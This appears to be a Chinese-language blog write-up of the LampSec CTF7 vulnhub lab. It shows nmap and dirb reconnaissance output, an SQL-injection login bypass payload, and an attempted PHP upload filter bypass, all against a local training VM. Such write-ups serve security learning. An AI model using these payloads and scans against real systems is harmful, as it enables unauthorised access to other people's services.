<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[vulnhub]  LampSec-CTF7 | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.7.0/styles/default.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-duotone-dark.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[vulnhub]  LampSec-CTF7</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-05-23T08:08:17.000Z" id="date"> 2023-05-23</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-05-23T16:34:31.367Z" id="updated"> 2023-05-24</time></div></span><br><span>Word Count: <div class="control">4k</div></span><br><span>Read Time: <div class="control">23 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/431ef4c15c924ca9deb0561a86d7d35034144840.jpg'><img src="/pic/431ef4c15c924ca9deb0561a86d7d35034144840.jpg" alt="431ef4c15c924ca9deb0561a86d7d35034144840"></p>
<span id="more"></span>

<h2 id="靶机部署"><a href="#靶机部署" class="headerlink" title="靶机部署"></a>靶机部署</h2><p>这台机子将其网卡设置为eth0。实际上的网卡是eth1。因此，我们需要删除配置文件&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0，并创建一个名为ifcfg-eth1的新文件。必须写在文件中的设置是<code>ONBOOT=yes BOOTPROTO=dhcp DEVICE=eth1 #要配置的网卡名</code>。然后<code>service network restart</code>就可以了。(在Cent OS 6中, 在大于等于7的版本应该使用<code>systemctl</code>)<br>其实之后最好把靶机丢到vm里面选择已经移动别选复制，这样容易保障网络环境配置不出问题。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/LampSecurity/ctf7/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap -sn 192.168.56.0/24
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> kali: 
Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-05-02 20:29 CST
Nmap scan report <span class="token keyword">for</span> 192.168.56.1
Host is up <span class="token punctuation">(</span>0.0014s latency<span class="token punctuation">)</span>.
MAC Address: 00:50:56:C0:00:08 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> 192.168.56.2
Host is up <span class="token punctuation">(</span>0.0010s latency<span class="token punctuation">)</span>.
MAC Address: 00:50:56:EC:CE:9E <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> 192.168.56.141
Host is up <span class="token punctuation">(</span>0.00089s latency<span class="token punctuation">)</span>.
MAC Address: 00:0C:29:AC:12:E4 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> 192.168.56.254
Host is up <span class="token punctuation">(</span>0.00060s latency<span class="token punctuation">)</span>.
MAC Address: 00:50:56:E6:06:A3 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> 192.168.56.132
Host is up.
Nmap done: 256 IP addresses <span class="token punctuation">(</span>5 hosts up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 2.02 seconds
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/LampSecurity/ctf7/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap -p- --min-rate<span class="token operator">=</span>10000 192.168.56.141
Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-05-02 20:30 CST
Nmap scan report <span class="token keyword">for</span> 192.168.56.141
Host is up <span class="token punctuation">(</span>0.0011s latency<span class="token punctuation">)</span>.
Not shown: 65507 filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>, 19 filtered tcp ports <span class="token punctuation">(</span>host-prohibited<span class="token punctuation">)</span>
PORT      STATE  SERVICE
22/tcp    <span class="token function">open</span>   <span class="token function">ssh</span>
80/tcp    <span class="token function">open</span>   http
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   <span class="token function">open</span>   netbios-ssn
901/tcp   <span class="token function">open</span>   samba-swat
5900/tcp  closed vnc
8080/tcp  <span class="token function">open</span>   http-proxy
10000/tcp <span class="token function">open</span>   snet-sensor-mgmt
MAC Address: 00:0C:29:AC:12:E4 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>

Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 13.48 seconds
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>还开了挺多端口的，80，8080，139，10000都可以看看。</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/LampSecurity/ctf7/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap -sU -p- --min-rate<span class="token operator">=</span>10000 192.168.56.141
Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-05-02 20:39 CST
Warning: 192.168.56.141 giving up on port because retransmission cap hit <span class="token punctuation">(</span>10<span class="token punctuation">)</span>.
Nmap scan report <span class="token keyword">for</span> 192.168.56.141
Host is up <span class="token punctuation">(</span>0.0019s latency<span class="token punctuation">)</span>.
All 65535 scanned ports on 192.168.56.141 are <span class="token keyword">in</span> ignored states.
Not shown: 65457 <span class="token function">open</span><span class="token operator">|</span>filtered udp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>, 78 filtered udp ports <span class="token punctuation">(</span>host-prohibited<span class="token punctuation">)</span>
MAC Address: 00:0C:29:AC:12:E4 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>

Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 72.81 seconds
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/LampSecurity/ctf7/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap -sT -sV -O -p22,80,137,138,139,901,5900,8080,10000 192.168.56.141
Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-05-02 20:47 CST
Nmap scan report <span class="token keyword">for</span> 192.168.56.141
Host is up <span class="token punctuation">(</span>0.00058s latency<span class="token punctuation">)</span>.

PORT      STATE  SERVICE     VERSION
22/tcp    <span class="token function">open</span>   <span class="token function">ssh</span>         OpenSSH 5.3 <span class="token punctuation">(</span>protocol 2.0<span class="token punctuation">)</span>
80/tcp    <span class="token function">open</span>   http        Apache httpd 2.2.15 <span class="token variable"><span class="token punctuation">((</span>CentOS<span class="token punctuation">))</span></span>
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   <span class="token function">open</span>   netbios-ssn Samba smbd 3.X - 4.X <span class="token punctuation">(</span>workgroup: MYGROUP<span class="token punctuation">)</span>
901/tcp   <span class="token function">open</span>   http        Samba SWAT administration server
5900/tcp  closed vnc
8080/tcp  <span class="token function">open</span>   http        Apache httpd 2.2.15 <span class="token variable"><span class="token punctuation">((</span>CentOS<span class="token punctuation">))</span></span>
10000/tcp <span class="token function">open</span>   http        MiniServ 1.610 <span class="token punctuation">(</span>Webmin httpd<span class="token punctuation">)</span>
MAC Address: 00:0C:29:AC:12:E4 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux 2.6.X<span class="token operator">|</span>3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.13
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>
Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 43.12 seconds
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>趁其它还在扫描的时间先看看80端口吧。</p>
<h2 id="EXPLOIT"><a href="#EXPLOIT" class="headerlink" title="EXPLOIT"></a>EXPLOIT</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>先目录发现一下，扫描的同时自己手动看看网页。</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/LampSecurity/ctf7/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> dirb http://192.168.56.141                                                                                
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> kali: 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue May  2 22:34:27 2023
URL_BASE: http://192.168.56.141/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>随便点点，发现有几个可以输入注册的地方，以及8080端口是个登录页面。<br class='item-img' data-src='/pic/assets/1683102250882-278d183f-2368-4cb6-8473-31466803b83b.png'><img src="/pic/assets/1683102250882-278d183f-2368-4cb6-8473-31466803b83b.png" alt="sqli-1.png"><br class='item-img' data-src='/pic/assets/sqli-2.png'><img src="/pic/assets/sqli-2.png" alt="sqli-2"><br class='item-img' data-src='/pic/assets/1683102281858-ef2fe860-798c-44e9-bfd0-840ee389f83a.png'><img src="/pic/assets/1683102281858-ef2fe860-798c-44e9-bfd0-840ee389f83a.png" alt="sqli-login.png"></p>
<h3 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h3><p>加点<code>&#39;</code>看看有何反应。<br class='item-img' data-src='/pic/assets/1683103622318-fce16b63-3c49-4e62-8134-dbcc0a32292d.png'><img src="/pic/assets/1683103622318-fce16b63-3c49-4e62-8134-dbcc0a32292d.png" alt="sqli-1-re.png"><br class='item-img' data-src='/pic/assets/1683103629581-9ab5c6f0-d1ff-4eb8-936c-25e5eb1c8ba3.png'><img src="/pic/assets/1683103629581-9ab5c6f0-d1ff-4eb8-936c-25e5eb1c8ba3.png" alt="sqli-2-re.png"><br>OK，存在sql注入漏洞。之后看看是否用sqlmap把库dump出来看看。<br>再在登录页面试试。</p>
<pre><code># 192.168.56.141:8080
admin
&#39;) or 1=1 #-- -
</code></pre>
<p>竟然直接登进来了。</p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>ok，不过一时间看不出是什么cms，那就找找有无什么可以上传文件的地方呗。<br class='item-img' data-src='/pic/assets/1683104068273-b08dd1c6-89e1-4894-9f97-f8a900786c57.png'><img src="/pic/assets/1683104068273-b08dd1c6-89e1-4894-9f97-f8a900786c57.png" alt="image.png">Fortunetly, we find the way to upload files.<br class='item-img' data-src='/pic/assets/1683104101704-4d3fa436-13b6-4275-8e20-191c19fda73c.png'><img src="/pic/assets/1683104101704-4d3fa436-13b6-4275-8e20-191c19fda73c.png" alt="image.png"><br>We try our PoC of upload vuln.<br class='item-img' data-src='/pic/assets/1683105006509-efcbfa09-df3b-4568-b950-959ed39623f4.png'><img src="/pic/assets/1683105006509-efcbfa09-df3b-4568-b950-959ed39623f4.png" alt="filter.png"><br>Seems that the <code>&lt;?</code>and<code>?&gt;</code> are filtered. However, even if we try to bypass the filter like <code>&lt;sript language=&quot;php&quot;&gt;payload&lt;/script&gt;</code>, the payload just doesn’t work.<br>As a result, we must find the path of the uploaded shell.<br>Oh, don’t forget we did web content discovery and it was done for sure. So let us take a look at it.</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/LampSecurity/ctf7/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> dirb http://192.168.56.141                                                                                
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> kali: 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue May  2 22:34:27 2023
URL_BASE: http://192.168.56.141/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.141/ ----
+ http://192.168.56.141/about <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:4910<span class="token punctuation">)</span>                                                                          
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/assets/                                                                                
+ http://192.168.56.141/backups <span class="token punctuation">(</span>CODE:301<span class="token operator">|</span>SIZE:333<span class="token punctuation">)</span>                                                                         
+ http://192.168.56.141/cgi-bin/ <span class="token punctuation">(</span>CODE:403<span class="token operator">|</span>SIZE:290<span class="token punctuation">)</span>                                                                        
+ http://192.168.56.141/contact <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:5017<span class="token punctuation">)</span>                                                                        
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/css/                                                                                   
+ http://192.168.56.141/db <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:3904<span class="token punctuation">)</span>                                                                             
+ http://192.168.56.141/default <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:6058<span class="token punctuation">)</span>                                                                        
+ http://192.168.56.141/footer <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:3904<span class="token punctuation">)</span>                                                                         
+ http://192.168.56.141/header <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:3904<span class="token punctuation">)</span>                                                                         
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/img/                                                                                   
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/inc/                                                                                   
+ http://192.168.56.141/index.php <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:6058<span class="token punctuation">)</span>                                                                      
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/js/                                                                                    
+ http://192.168.56.141/newsletter <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:4037<span class="token punctuation">)</span>                                                                     
+ http://192.168.56.141/phpinfo <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:58762<span class="token punctuation">)</span>                                                                       
+ http://192.168.56.141/profile <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:3977<span class="token punctuation">)</span>                                                                        
+ http://192.168.56.141/read <span class="token punctuation">(</span>CODE:302<span class="token operator">|</span>SIZE:1<span class="token punctuation">)</span>                                                                              
+ http://192.168.56.141/recovery <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:4807<span class="token punctuation">)</span>                                                                       
+ http://192.168.56.141/register <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:6591<span class="token punctuation">)</span>                                                                       
+ http://192.168.56.141/signup <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:4783<span class="token punctuation">)</span>                                                                         
+ http://192.168.56.141/usage <span class="token punctuation">(</span>CODE:403<span class="token operator">|</span>SIZE:287<span class="token punctuation">)</span>                                                                           
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webalizer/                                                                             
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/                                                                               
                                                                                                                            
---- Entering directory: http://192.168.56.141/assets/ ----
<span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
    <span class="token punctuation">(</span>Use mode <span class="token string">'-w'</span> <span class="token keyword">if</span> you want to scan it anyway<span class="token punctuation">)</span>
                                                                                                                            
---- Entering directory: http://192.168.56.141/css/ ----
<span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
    <span class="token punctuation">(</span>Use mode <span class="token string">'-w'</span> <span class="token keyword">if</span> you want to scan it anyway<span class="token punctuation">)</span>
                                                                                                                            
---- Entering directory: http://192.168.56.141/img/ ----
<span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
    <span class="token punctuation">(</span>Use mode <span class="token string">'-w'</span> <span class="token keyword">if</span> you want to scan it anyway<span class="token punctuation">)</span>
                                                                                                                            
---- Entering directory: http://192.168.56.141/inc/ ----
<span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
    <span class="token punctuation">(</span>Use mode <span class="token string">'-w'</span> <span class="token keyword">if</span> you want to scan it anyway<span class="token punctuation">)</span>
                                                                                                                            
---- Entering directory: http://192.168.56.141/js/ ----
<span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
    <span class="token punctuation">(</span>Use mode <span class="token string">'-w'</span> <span class="token keyword">if</span> you want to scan it anyway<span class="token punctuation">)</span>
                                                                                                                            
---- Entering directory: http://192.168.56.141/webalizer/ ----
+ http://192.168.56.141/webalizer/index.html <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:3671<span class="token punctuation">)</span>                                                           
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/ ----
+ http://192.168.56.141/webmail/bin <span class="token punctuation">(</span>CODE:403<span class="token operator">|</span>SIZE:293<span class="token punctuation">)</span>                                                                     
+ http://192.168.56.141/webmail/config <span class="token punctuation">(</span>CODE:403<span class="token operator">|</span>SIZE:296<span class="token punctuation">)</span>                                                                  
+ http://192.168.56.141/webmail/favicon.ico <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:1150<span class="token punctuation">)</span>                                                            
+ http://192.168.56.141/webmail/index.php <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:5157<span class="token punctuation">)</span>                                                              
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/installer/                                                                     
+ http://192.168.56.141/webmail/LICENSE <span class="token punctuation">(</span>CODE:403<span class="token operator">|</span>SIZE:297<span class="token punctuation">)</span>                                                                 
+ http://192.168.56.141/webmail/logs <span class="token punctuation">(</span>CODE:403<span class="token operator">|</span>SIZE:294<span class="token punctuation">)</span>                                                                    
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/plugins/                                                                       
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/program/                                                                       
+ http://192.168.56.141/webmail/README <span class="token punctuation">(</span>CODE:403<span class="token operator">|</span>SIZE:296<span class="token punctuation">)</span>                                                                  
+ http://192.168.56.141/webmail/robots.txt <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:26<span class="token punctuation">)</span>                                                               
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/skins/                                                                         
+ http://192.168.56.141/webmail/SQL <span class="token punctuation">(</span>CODE:403<span class="token operator">|</span>SIZE:293<span class="token punctuation">)</span>                                                                     
+ http://192.168.56.141/webmail/temp <span class="token punctuation">(</span>CODE:403<span class="token operator">|</span>SIZE:294<span class="token punctuation">)</span>                                                                    
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/installer/ ----
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/installer/images/                                                              
+ http://192.168.56.141/webmail/installer/index.php <span class="token punctuation">(</span>CODE:302<span class="token operator">|</span>SIZE:0<span class="token punctuation">)</span>                                                       
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/plugins/ ----
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/plugins/archive/                                                               
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/plugins/emoticons/                                                             
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/plugins/help/                                                                  
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/plugins/password/                                                              
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/plugins/userinfo/                                                              
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/program/ ----
<span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> WARNING: All responses <span class="token keyword">for</span> this directory seem to be CODE <span class="token operator">=</span> 403.                                                        
    <span class="token punctuation">(</span>Use mode <span class="token string">'-w'</span> <span class="token keyword">if</span> you want to scan it anyway<span class="token punctuation">)</span>
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/skins/ ----
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/skins/classic/                                                                 
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/installer/images/ ----
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/plugins/archive/ ----
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/plugins/archive/skins/                                                         
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/plugins/emoticons/ ----
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/plugins/help/ ----
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/plugins/help/content/                                                          
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/plugins/help/skins/                                                            
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/plugins/password/ ----
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/plugins/password/drivers/                                                      
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/plugins/password/helpers/                                                      
+ http://192.168.56.141/webmail/plugins/password/README <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:10645<span class="token punctuation">)</span>                                               
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/plugins/userinfo/ ----
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/skins/classic/ ----
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/                                                          
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/skins/classic/includes/                                                        
+ http://192.168.56.141/webmail/skins/classic/README <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:855<span class="token punctuation">)</span>                                                    
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/skins/classic/templates/                                                       
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/plugins/archive/skins/ ----
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/plugins/archive/skins/classic/                                                 
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/plugins/help/content/ ----
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/plugins/help/skins/ ----
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/plugins/help/skins/classic/                                                    
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/plugins/password/drivers/ ----
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/plugins/password/helpers/ ----
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/ ----
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/buttons/                                                  
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/display/                                                  
+ http://192.168.56.141/webmail/skins/classic/images/favicon.ico <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:1150<span class="token punctuation">)</span>                                       
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/icons/                                                    
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/skins/classic/includes/ ----
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/skins/classic/templates/ ----
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/plugins/archive/skins/classic/ ----
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/plugins/help/skins/classic/ ----
<span class="token operator">==</span><span class="token operator">></span> DIRECTORY: http://192.168.56.141/webmail/plugins/help/skins/classic/templates/                                          
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/buttons/ ----
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/display/ ----
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/icons/ ----
                                                                                                                            
---- Entering directory: http://192.168.56.141/webmail/plugins/help/skins/classic/templates/ ----
                                                                               /zt                                          
-----------------
END_TIME: Tue May  2 22:39:31 2023
DOWNLOADED: 124624 - FOUND: 32
